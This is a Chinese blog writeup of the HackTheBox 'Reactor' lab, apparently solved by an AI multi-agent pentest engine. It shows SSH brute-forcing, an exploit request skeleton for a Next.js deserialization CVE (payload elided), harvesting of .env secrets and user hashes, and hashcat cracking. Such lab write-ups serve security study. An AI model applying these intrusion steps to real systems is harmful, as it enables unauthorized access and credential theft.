@@ -1,0 +1,375 @@
+<!DOCTYPE html><html lang="zh-CN"> <!-- Global Metadata --><head><!-- Blocking theme script to prevent flash --><script>
+    (function() {
+      var theme = localStorage.getItem("theme") || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      if (theme === "dark") document.documentElement.classList.add("dark");
+    })();
+  </script><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><!-- Favicon --><link rel="icon" type="image/jpeg" href="/laojun.jpg"><!-- Apple Touch Icon --><link rel="apple-touch-icon" sizes="180x180" href="/laojun.jpg"><!-- PWA Icons --><link rel="icon" type="image/jpeg" sizes="192x192" href="/laojun.jpg"><link rel="icon" type="image/jpeg" sizes="512x512" href="/laojun.jpg"><!-- PWA Manifest --><link rel="manifest" href="/manifest.json"><!-- Theme Color --><meta name="theme-color" content="#3F9C87"><meta name="msapplication-TileColor" content="#3F9C87"><meta name="generator" content="Astro v5.18.1"><!-- Primary Meta Tags --><title>HackTheBox Machine Reactor</title><meta name="title" content="HackTheBox Machine Reactor"><meta name="description" content><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.wansh.xin/posts/reactor/reactor-writeup/"><meta property="og:title" content="HackTheBox Machine Reactor"><meta property="og:description" content><meta property="og:image" content="https://blog.wansh.xin/og-image.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog.wansh.xin/posts/reactor/reactor-writeup/"><meta property="twitter:title" content="HackTheBox Machine Reactor"><meta property="twitter:description" content><meta name="twitter:creator" content="@N0nome"><meta name="twitter:image" content="https://blog.wansh.xin/og-image.png"><!-- RSS Link --><link rel="alternate" type="application/rss+xml" title="N0nome" href="https://blog.wansh.xin/rss.xml"><!-- canonical url --><link rel="canonical" href="https://blog.wansh.xin/posts/reactor/reactor-writeup/"><!-- Sitemap --><link rel="sitemap" href="/sitemap-index.xml"><!-- pagefind --><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind.js"></script><script src="/pagefind/pagefind-ui.js" defer></script><!-- font  --><style>@font-face{font-family:"Space Grotesk-8e2368398fb36df3";src:url("/_astro/fonts/ced25f06cd1523a3.woff2") format("woff2");font-display:swap;unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-weight:400;font-style:normal;}@font-face{font-family:"Space Grotesk-8e2368398fb36df3 fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:109.6903%;ascent-override:89.7072%;descent-override:26.6204%;line-gap-override:0%;}:root{--font-display:"Space Grotesk-8e2368398fb36df3","Space Grotesk-8e2368398fb36df3 fallback: Arial",sans-serif;}</style><link rel="preload" href="/_astro/fonts/ced25f06cd1523a3.woff2" as="font" type="font/woff2" crossorigin><!-- View Transtions --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CDGfc0hd.js"></script><link rel="stylesheet" href="/_astro/_slug_.PGNbfF7Z.css">
+<link rel="stylesheet" href="/_astro/_slug_.CZKGlsKO.css"><style>[data-astro-transition-scope="astro-ekl2o7or-1"] { view-transition-name: main-container; }@layer astro { ::view-transition-old(main-container) { 
+	animation-duration: 90ms, 220ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both, both;
+	animation-name: astroFadeOut, astroSlideToLeft; }::view-transition-new(main-container) { 
+	animation-duration: 210ms, 220ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
+	animation-delay: 30ms;
+	animation-fill-mode: both, both;
+	animation-name: astroFadeIn, astroSlideFromRight; }[data-astro-transition=back]::view-transition-old(main-container) { 
+	animation-name: astroFadeOut, astroSlideToRight; }[data-astro-transition=back]::view-transition-new(main-container) { 
+	animation-name: astroFadeIn, astroSlideFromLeft; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-ekl2o7or-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-ekl2o7or-1"] { 
+	animation-duration: 90ms, 220ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both, both;
+	animation-name: astroFadeOut, astroSlideToLeft; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-ekl2o7or-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-ekl2o7or-1"] { 
+	animation-duration: 210ms, 220ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
+	animation-delay: 30ms;
+	animation-fill-mode: both, both;
+	animation-name: astroFadeIn, astroSlideFromRight; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-ekl2o7or-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-ekl2o7or-1"] { 
+	animation-name: astroFadeOut, astroSlideToRight; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-ekl2o7or-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-ekl2o7or-1"] { 
+	animation-name: astroFadeIn, astroSlideFromLeft; }</style></head><body class="flex min-h-screen items-center justify-center bg-background p-2 font-display text-foreground antialiased selection:bg-primary/20 md:p-6">  <meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"> <div class="article-view relative flex min-h-[100dvh] w-full max-w-[95vw] flex-col overflow-visible rounded-none border border-border bg-card shadow-main md:h-[88vh] md:min-h-0 md:flex-row md:overflow-hidden md:rounded-[2.5rem]" data-astro-cid-zm77yjld data-astro-transition-scope="astro-ekl2o7or-1"> <!-- Main Content Area (wider) --> <main class="order-1 flex flex-col items-center overflow-visible md:custom-scrollbar md:order-2 md:flex-1 md:overflow-x-hidden md:overflow-y-auto" data-astro-cid-zm77yjld> <div class="w-full" data-astro-cid-zm77yjld>  <article class="animate-in fade-in w-full overflow-visible px-6 py-6 duration-1000 md:custom-scrollbar md:h-full md:overflow-x-hidden md:overflow-y-auto md:px-12 md:py-8"> <header class="mb-16 border-b border-border/50 pb-12" data-pagefind-body> <div class="mb-6 flex items-center gap-2 text-[10px] font-bold tracking-[0.2em] text-primary uppercase"> <a href="/posts" class="hover:underline">Writing</a> <span class="text-muted-foreground/30">/</span> <span>Detail</span> </div> <h1 class="mb-8 text-3xl leading-[1.4] font-bold text-foreground md:text-4xl"> HackTheBox Machine Reactor </h1> <div class="animate-in fade-in flex flex-wrap gap-2 font-mono text-[12px] tracking-tight duration-1000 md:gap-3"> <div class="flex items-center gap-3 rounded-full border border-border/40 bg-muted/40 px-3 py-1 text-muted-foreground"> <div class="flex items-center gap-1.5"> <svg width="1em" height="1em" data-icon="mdi:calendar-blank">   <symbol id="ai:mdi:calendar-blank" viewBox="0 0 24 24"><path fill="currentColor" d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1"/></symbol><use href="#ai:mdi:calendar-blank"></use>  </svg> <span id="post-date" data-updated="Not updated">2026.05.25</span> </div> <span class="h-3 w-px bg-border"></span> <a href="/categories/random" class="flex cursor-pointer items-center gap-1.5 transition-colors hover:text-primary"> <svg width="1em" height="1em" data-icon="mdi:category-outline">   <symbol id="ai:mdi:category-outline" viewBox="0 0 24 24"><path fill="currentColor" d="M11 13.5v8H3v-8zm-2 2H5v4h4zM12 2l5.5 9h-11zm0 3.86L10.08 9h3.84zM17.5 13c2.5 0 4.5 2 4.5 4.5S20 22 17.5 22S13 20 13 17.5s2-4.5 4.5-4.5m0 2a2.5 2.5 0 0 0-2.5 2.5a2.5 2.5 0 0 0 2.5 2.5a2.5 2.5 0 0 0 2.5-2.5a2.5 2.5 0 0 0-2.5-2.5"/></symbol><use href="#ai:mdi:category-outline"></use>  </svg> <span>Random</span> </a> </div> <div class="flex items-center gap-4 rounded-full border border-border/20 bg-muted/20 px-3 py-1 text-muted-foreground/80"> <div class="flex items-center gap-1.5"> <span class="post-words-count">10303 </span> <span class="text-[10px] uppercase opacity-90">Words</span> </div> <div class="flex items-center gap-1.5"> <span class="artalk-pv-count" data-page-key="/posts/reactor/reactor-writeup/" class="font-bold text-foreground/80">-</span> <span class="text-[10px] uppercase opacity-90">Views</span> </div> <div class="flex items-center gap-1.5"> <span class="artalk-comment-count" data-page-key="/posts/reactor/reactor-writeup/" class="font-bold text-foreground/80">-</span> <span class="text-[10px] uppercase opacity-90">Comments</span> </div> </div> </div> </header> <div class="prose max-w-none dark:prose-invert prose-headings:tracking-tight prose-p:mb-8 prose-p:leading-loose prose-p:font-normal prose-p:text-muted-foreground prose-p:text-lg prose-blockquote:text-primary/70 dark:prose-blockquote:text-primary/60 prose-code:rounded-sm prose-code:bg-primary/15 prose-code:px-1.5 prose-code:py-0.5 prose-code:text-primary prose-code:before:content-none prose-code:after:content-none prose-" data-pagefind-body> <blockquote>
+<p>本次靶机采用AI进行，弄来玩玩，聊以慰藉。
+<strong>靶机</strong>: Reactor (HTB) | <strong>难度</strong>: Easy | <strong>平台</strong>: Linux<br>
+<strong>工具链</strong>: <a href="https://github.com/oritera/cairn">Cairn</a> — 基于黑板架构的 AI 多 Agent 渗透引擎<br>
+<strong>LLM</strong>: DeepSeek V4-Pro · <strong>Worker</strong>: Claude Code
+连接到HTB采用AthenaOS提供的<a href="https://athenaos.org/en/resources/htb-toolkit/#_top">htb-toolkit</a></p>
+</blockquote>
+<h2 id="1-executive-summary">1. Executive Summary</h2>
+<p>Reactor 是一台看似简单但充满误导的 HTB 靶机。表面上有两个开放端口——SSH 和 Next.js Web 仪表盘。Web 应用初看是完全静态的 “decoy” 页面，目录爆破、源代码审计、VHost fuzzing 全部返回零结果。真正的入口点是 <strong>CVE-2025-66478 (React2Shell)</strong>——一个 CVSS 10.0 的 Next.js 15.0.3 Server Action 反序列化 RCE 漏洞。据守 After obtaining initial access as <code>node</code>, credential harvesting from a SQLite database yielded the <code>engineer</code> user’s MD5 hash, which cracked to <code>reactor1</code>. SSH lateral movement then revealed a <strong>Node.js Inspector Debugger</strong> listening as root on <code>127.0.0.1:9229</code>, providing a direct path to SYSTEM/root.</p>
+<p>本次渗透测试完全由 <strong>Cairn AI Agent 集群</strong> 自动驱动，通过事实图谱（Fact Graph）上的 OODA 循环自主完成——从侦察到漏洞识别到提权，全程无需人工干预（除了一次关键的方向纠正 Hint）。</p>
+<p><strong>Key Metrics</strong>:</p>
+<ul>
+<li>总耗时: ~44 分钟（从 VPN 连接到双 Flag）</li>
+<li>AI Agent 执行的任务数: 19 个 Intents 被提出，13 个 Explore 被执行</li>
+<li>发现的漏洞: CVE-2025-66478 (React2Shell)、Node.js Inspector 未授权 RCE</li>
+<li>SSH 爆破尝试: 1,856 次（零成功——方向错误的重要教训）</li>
+</ul>
+<hr>
+<h2 id="2-侦察与枚举">2. 侦察与枚举</h2>
+<h3 id="21-端口扫描">2.1 端口扫描</h3>
+<p>naabu 全端口扫描在目标 <code>10.129.177.191</code> 上发现两个开放 TCP 端口:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.6p1 (Ubuntu)</td></tr><tr><td>3000/tcp</td><td>HTTP</td><td>Next.js “ReactorWatch | Core Monitoring System v3.2.1”</td></tr></tbody></table>
+<p>常见 Web 端口（80、443、8080、8443）全部返回 Connection Refused。UDP 扫描（29 个常用端口）无活跃服务。</p>
+<h3 id="22-dns--vhost-枚举">2.2 DNS / VHost 枚举</h3>
+<p>针对多种 TLD（<code>.htb</code>、<code>.vl</code>、<code>.com</code>、<code>.local</code>、<code>.lab</code>）的 DNS 子域枚举和 VHost fuzzing：</p>
+<ul>
+<li>dig/nslookup 对常见子域名（gitlab, wiki, admin, dev, api, jenkins 等）全部解析失败</li>
+<li>PTR 记录仅返回 IP 地址</li>
+<li>目标未运行 DNS 服务（端口 53 拒绝连接）</li>
+<li>AXFR 区域传输失败</li>
+<li>ffuf VHost fuzzing（30+ Host header 变体）全部返回相同 HTTP 200，MD5 和 body 大小完全一致</li>
+</ul>
+<p><strong>结论</strong>: 无 DNS/VHost 攻击面。</p>
+<h3 id="23-web-应用深度分析">2.3 Web 应用深度分析</h3>
+<h4 id="目录爆破">目录爆破</h4>
+<div class="expressive-code"><link rel="stylesheet" href="/_astro/ec.bpbiv.css"><script type="module" src="/_astro/ec.0vx5m.js"></script><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#FFCB6B;--1:#8B5B12">gobuster</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">dir</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">-u</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">http://10.129.177.191:3000</span><span style="--0:#EEFFFF;--1:#5A676D"> \</span></div></div><div class="ec-line"><div class="code"><span class="indent">  </span><span style="--0:#C3E88D;--1:#566D35">-w</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</span><span style="--0:#EEFFFF;--1:#5A676D"> \</span></div></div><div class="ec-line"><div class="code"><span class="indent">  </span><span style="--0:#C3E88D;--1:#566D35">-x</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">js,json,php,html,txt</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">-t</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#F78C6C;--1:#A64930">50</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="gobuster dir -u http://10.129.177.191:3000 \  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \  -x js,json,php,html,txt -t 50"><div></div></button></div></figure></div>
+<p>唯一命中的 <code>/cgi-bin/</code> 是 Next.js trailing-slash 处理的 308 重定向伪影，最终返回 404。手动测试了 50+ 常见路径（/login, /admin, /api, /graphql, /.env, /.git 等）——全部 404。</p>
+<h4 id="react-server-components-rsc-payload-分析">React Server Components (RSC) Payload 分析</h4>
+<p>ReactorWatch 是一个<strong>完全静态预渲染</strong>的 Next.js 单页仪表盘。关键特征:</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">Build ID: L3bimJe_3LvBcFWAnK5L4</span></div></div><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">x-nextjs-prerender: 1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">ISR stale-time: maxed</span></div></div><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">Next.js version: 15.0.3 (extracted from chunk-517.js)</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="Build ID: L3bimJe_3LvBcFWAnK5L4x-nextjs-prerender: 1ISR stale-time: maxedNext.js version: 15.0.3 (extracted from chunk-517.js)"><div></div></button></div></figure></div>
+<p>RSC payload 经 <code>self.__next_f.push()</code> 内联在 HTML 中，解码后仅包含仪表盘 UI 树——无隐藏路由、凭据或业务逻辑。所有 JavaScript chunk 均为 React/Next.js 框架标准库代码，不包含任何自定义应用逻辑。</p>
+<h4 id="网页误判">网页误判</h4>
+<p>初始分析认定 ReactorWatch 是纯 decoy/静态前端，没有可利用的 Web 向量。这个结论<strong>部分是错误的</strong>——虽然 Web 应用本身确实没有传统的输入点（登录表单项、API 端点、文件上传），但忽视了 Next.js 框架层面（Server Actions、Flight Protocol）的漏洞可能。</p>
+<hr>
+<h2 id="3-方向纠正从-ssh-爆破到-nextjs-cve">3. 方向纠正：从 SSH 爆破到 Next.js CVE</h2>
+<h3 id="31-死胡同">3.1 死胡同</h3>
+<p>AI Agent 在 Web 分析完毕后的第一反应是转向 SSH 爆破：</p>
+<ul>
+<li>构建了 15 个用户名 × 116 个密码的字典（含 reactor/nuclear 主题变体）</li>
+<li>Hydra 执行 1,856 次尝试 → <strong>零成功</strong></li>
+</ul>
+<h3 id="32-hint-注入人机协作的威力">3.2 Hint 注入——人机协作的威力</h3>
+<p>在观察到 Agent 陷入 SSH 死循环后，通过 Cairn 的 <strong>Hint 机制</strong> 注入了一条方向纠正：</p>
+<blockquote>
+<p>“SSH brute-force is WRONG. Focus on Next.js CVEs on port 3000: CVE-2025-66478 (Server Action auth bypass), CVE-2024-56332 (SSRF in image optimization), CVE-2024-51479 (middleware auth bypass).”</p>
+</blockquote>
+<p>这个 Hint 在下一个 Reason 循环中被 Agent 吸收，立即扭转了探索方向。<strong>Hint 机制是 Cairn 架构中最优雅的设计之一</strong>——人类可以随时向共享黑板上注入判断，而不会被 Agent 的内部状态所困。</p>
+<hr>
+<h2 id="4-foothold-cve-2025-66478-react2shell">4. Foothold: CVE-2025-66478 (React2Shell)</h2>
+<h3 id="41-漏洞分析">4.1 漏洞分析</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>CVE</td><td>CVE-2025-66478</td></tr><tr><td>别名</td><td>React2Shell</td></tr><tr><td>CVSS</td><td><strong>10.0 (Critical)</strong></td></tr><tr><td>影响版本</td><td>Next.js 15.0.0 – 15.0.4</td></tr><tr><td>修复版本</td><td>15.0.5</td></tr><tr><td>靶机版本</td><td><strong>15.0.3 (受影响)</strong></td></tr><tr><td>漏洞类型</td><td>React Flight Protocol 反序列化 → 原型污染 → RCE</td></tr></tbody></table>
+<p>Next.js 15.x 的 Server Actions 使用 React Flight Protocol（基于 <code>multipart/form-data</code> 的 RSC 流式传输）。该协议的 <code>__proto__</code> 反序列化过程中存在原型污染，攻击者可以通过精心构造的多部分 POST 请求注入恶意对象属性，最终触发任意代码执行。</p>
+<h3 id="42-cve-筛选过程">4.2 CVE 筛选过程</h3>
+<p>AI Agent 针对 Next.js 15.0.3 系统性评估了以下 CVE：</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>CVE</th><th>影响</th><th>靶机可利用否</th></tr></thead><tbody><tr><td>CVE-2025-66478</td><td>Server Action RCE (CVSS 10.0)</td><td>✅ 可利用</td></tr><tr><td>CVE-2025-29927</td><td>Middleware Bypass (CVSS 9.1)</td><td>❌ 无 auth middleware 可绕过</td></tr><tr><td>CVE-2024-51479</td><td>Auth Bypass (CVSS 7.5)</td><td>❌ 仅影响 &#x3C; 14.2.15</td></tr><tr><td>CVE-2024-56332</td><td>SSRF via Image Optimization</td><td>❌ url 验证器阻止了所有外部/文件协议</td></tr><tr><td>CVE-2024-39698</td><td>Cache Poisoning</td><td>❌ 静态页面无缓存机制</td></tr></tbody></table>
+<h3 id="43-exploit">4.3 Exploit</h3>
+<p>确认 Server Action 端点存活：</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="http"><code><div class="ec-line"><div class="code"><span style="--0:#89DDFF;--0fs:italic;--1:#256F74;--1fs:italic">POST</span><span style="--0:#EEFFFF;--1:#5A676D"> / </span><span style="--0:#F78C6C;--1:#A64930">HTTP</span><span style="--0:#EEFFFF;--1:#5A676D">/</span><span style="--0:#F78C6C;--1:#A64930">1.1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#F07178;--1:#BE2F2C">Host</span><span style="--0:#F78C6C;--1:#A64930">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">10.129.177.191:3000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#F07178;--1:#BE2F2C">Content-Type</span><span style="--0:#F78C6C;--1:#A64930">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">multipart/form-data</span></div></div><div class="ec-line"><div class="code"><span style="--0:#F07178;--1:#BE2F2C">Next-Action</span><span style="--0:#F78C6C;--1:#A64930">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">&#x3C;arbitrary-action-id></span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">...multipart body with prototype pollution payload...</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="POST / HTTP/1.1Host: 10.129.177.191:3000Content-Type: multipart/form-dataNext-Action: <arbitrary-action-id>...multipart body with prototype pollution payload..."><div></div></button></div></figure></div>
+<p>关键发现：</p>
+<ul>
+<li><strong>Action ID 值任意</strong> —— 空字符串、任意字符串、RSC payload hash 均可用</li>
+<li><strong>响应特征</strong> —— HTTP 500 + <code>Content-Type: text/x-component</code>，命令输出嵌入在 <code>1:E{"digest":"&#x3C;output>"}</code> Flight stream 中</li>
+<li><strong>获取的 shell</strong> —— <code>node</code> 用户 (uid=999, gid=988)</li>
+</ul>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># 验证 exploit 成功</span></div></div><div class="ec-line"><div class="code"><span style="--0:#FFCB6B;--1:#8B5B12">id</span><span style="--0:#EEFFFF;--1:#5A676D">       </span><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># uid=999(node) gid=988(node)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#FFCB6B;--1:#8B5B12">hostname</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># reactor</span></div></div><div class="ec-line"><div class="code"><span style="--0:#FFCB6B;--1:#8B5B12">uname</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">-a</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># Linux 6.8.0-117-generic x86_64</span></div></div><div class="ec-line"><div class="code"><span style="--0:#82AAFF;--1:#4C6690">pwd</span><span style="--0:#EEFFFF;--1:#5A676D">      </span><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># /opt/reactor-app</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="id       # uid=999(node) gid=988(node)hostname # reactoruname -a # Linux 6.8.0-117-generic x86_64pwd      # /opt/reactor-app"><div></div></button></div></figure></div>
+<p>Web decoy 不假，但<strong>框架漏洞</strong>让 decoy 本身成为了入口。这就是为什么 CVE 研究比目录爆破重要得多。</p>
+<hr>
+<h2 id="5-凭据发现与横向移动">5. 凭据发现与横向移动</h2>
+<h3 id="51-信息收集node-用户">5.1 信息收集（node 用户）</h3>
+<p>作为 <code>node</code> 用户获得 shell 后，在 <code>/opt/reactor-app/</code> 目录下发现：</p>
+<p><strong>.env 文件</strong>:</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k</span></div></div><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">DB_PATH=/opt/reactor-app/reactor.db</span></div></div><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0kDB_PATH=/opt/reactor-app/reactor.dbALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook"><div></div></button></div></figure></div>
+<p><strong>reactor.db (SQLite)</strong>:</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="sql"><code><div class="ec-line"><div class="code"><span style="--0:#F78C6C;--1:#A64930">SELECT</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">*</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#F78C6C;--1:#A64930">FROM</span><span style="--0:#EEFFFF;--1:#5A676D"> users;</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">| username   | password_hash                        | </span><span style="--0:#F78C6C;--1:#A64930">role</span><span style="--0:#EEFFFF;--1:#5A676D">          |</span></div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">|</span><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic">------------|--------------------------------------|---------------|</span></div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">| </span><span style="--0:#F78C6C;--1:#A64930">admin</span><span style="--0:#EEFFFF;--1:#5A676D">      | a203b22191d744a4e70ada5c101b17b8     | administrator |</span></div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">| engineer   | 39d97110eafe2a9a68639812cd271e8e     | operator       |</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="SELECT * FROM users;| username   | password_hash                        | role          ||------------|--------------------------------------|---------------|| admin      | a203b22191d744a4e70ada5c101b17b8     | administrator || engineer   | 39d97110eafe2a9a68639812cd271e8e     | operator       |"><div></div></button></div></figure></div>
+<h3 id="52-md5-破解">5.2 MD5 破解</h3>
+<p>两枚哈希均为未加盐的 MD5：</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># engineer 的哈希成功破解</span></div></div><div class="ec-line"><div class="code"><span style="--0:#82AAFF;--1:#4C6690">echo</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">'</span><span style="--0:#C3E88D;--1:#566D35">39d97110eafe2a9a68639812cd271e8e</span><span style="--0:#89DDFF;--1:#256F74">'</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">></span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">hash.txt</span></div></div><div class="ec-line"><div class="code"><span style="--0:#FFCB6B;--1:#8B5B12">hashcat</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">-m</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#F78C6C;--1:#A64930">0</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">hash.txt</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">/usr/share/wordlists/rockyou.txt</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">--force</span></div></div><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># 结果: reactor1</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># admin 的哈希不在 rockyou 字典中</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="echo &#x27;39d97110eafe2a9a68639812cd271e8e&#x27; > hash.txthashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force"><div></div></button></div></figure></div>
+<p><code>reactor1</code>——密码强度堪忧，但在 “Easy” 难度的 HTB 靶机中属于典型套路。</p>
+<h3 id="53-ssh-登录--user-flag">5.3 SSH 登录 &#x26; User Flag</h3>
